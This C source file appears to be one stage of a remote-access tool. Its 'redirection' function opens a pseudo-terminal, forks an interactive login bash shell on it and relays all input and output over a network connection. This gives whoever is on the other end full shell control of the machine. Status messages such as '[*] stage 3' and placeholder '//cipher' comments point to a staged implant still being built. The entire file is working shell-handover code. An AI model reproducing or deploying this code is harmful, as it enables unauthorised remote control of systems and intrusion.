#define _XOPEN_SOURCE 600
#include "headers.h"
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <sys/ioctl.h>

void redirection(int connID){
	printf("[*] stage 3");
	
	int masterFD;
	char *slaveName;
	pid_t pid;


	masterFD = posix_openpt(O_RDWR | O_NOCTTY);
	if(masterFD<0){
		//error...
		return;
	}
	
	grantpt(masterFD);
	unlockpt(masterFD);
	slaveName = ptsname(masterFD);

	char ok[] = "PTY SUCESSFULLY SPAWND";
	send(connID, ok, strlen(ok), 0);
	
	pid = fork();

	if(pid==0){
		setsid();
		
		int slaveFD = open(slaveName, O_RDWR);
		close(masterFD);

		dup2(slaveFD, STDIN_FILENO);
		dup2(slaveFD, STDOUT_FILENO);
		dup2(slaveFD, STDERR_FILENO);

		putenv("TERM=xterm-256color");

		char *argv[] = {"/bin/bash", "--login", NULL};
		execve("/bin/bash", argv, NULL);

		exit(0);
	}else{
		char buffer[2048];
		fd_set read_fds;
		int max_fd = (connID > masterFD) ? connID : masterFD;
		
		while(1){
			FD_ZERO(&read_fds);
			FD_SET(connID, &read_fds);
			FD_SET(masterFD, &read_fds);

			if(select(max_fd+1, &read_fds, NULL,NULL,NULL)<0){
				//error...
				break;
			}
			
			if(FD_ISSET(connID, &read_fds)){
				int bytes = read(connID, buffer, sizeof(buffer));
				if(bytes<0) break;

				//cipher
				write(masterFD, buffer, bytes);
			}

			if(FD_ISSET(masterFD, &read_fds)){
				int bytes = read(masterFD, buffer, sizeof(buffer));
				if(bytes<0) break;

				//cipher
				write(connID, buffer, bytes);
			}

		}

		close(masterFD);
		waitpid(pid, NULL, 0);
		printf("[*] PTY Session Closed");
	}
}
